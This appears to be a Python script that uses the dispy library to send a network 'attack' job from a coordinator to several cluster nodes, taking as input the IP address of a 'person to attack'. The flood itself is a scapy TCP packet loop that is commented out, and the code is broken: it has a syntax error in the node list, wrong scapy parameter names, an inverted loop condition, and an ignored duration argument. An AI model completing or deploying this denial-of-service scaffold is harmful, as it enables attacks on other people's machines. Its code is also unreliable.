
# 'compute' is distributed to each node running 'dispynode'
def attack(ip_to_attack, duration):
    import time, socket
    from scapy.all import IP, TCP, send
    start = time.perf_counter()
    
    i = 1

    # while time.perf_counter() - start > duration:
    #     for source_port in range(1, 65535):
    #         IP1 = IP(source_IP = source_IP, destination = target_IP)
    #         TCP1 = TCP(srcport = source_port, dstport = 80)
    #         pkt = IP1 / TCP1
    #         send(pkt, inter = .001)
    #         i = i + 1
    return i, socket.gethostname()


# dispy calls this function to indicate change in job status
def job_callback(job): # executed at the client
    pass


# main 
if __name__ == '__main__':
    import dispy, argparse, logging, socket, sys, os, random, dispy.httpd

    server_nodes = ['10.0.0.21'], '10.0.0.12']#, '10.0.0.20', '10.0.0.21']

    parser = argparse.ArgumentParser()
    parser.add_argument("ip_addr_to_attack", type=str, help="IP Address of Person to attack")
    parser.add_argument("attack_length", type =int, help="Length of Attack")
    args = parser.parse_args()

    ip_addr_to_attack = args.ip_addr_to_attack
    attack_length = args.attack_length

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    cluster = dispy.JobCluster(attack, ip_addr=s.getsockname()[0], nodes=server_nodes, callback=job_callback, loglevel=logging.INFO)
    # View Job Progress @ https://{master}:8181
    http_server = dispy.httpd.DispyHTTPServer(cluster)

    print(('Submitting attack of %s for %i seconds each to %s' % (ip_addr_to_attack, attack_length, server_nodes)))
    jobs = []
    for i in range(10):

        job = cluster.submit(ip_addr_to_attack, random.randint(1,5))
        job.id = i
        jobs.append(job)

    cluster.wait()

    for job in jobs:
        packets_sent, host = job()
        print('Attack Executed on %s for %s seconds' % (packets_sent, host))
    cluster.print_status()
    cluster.close()
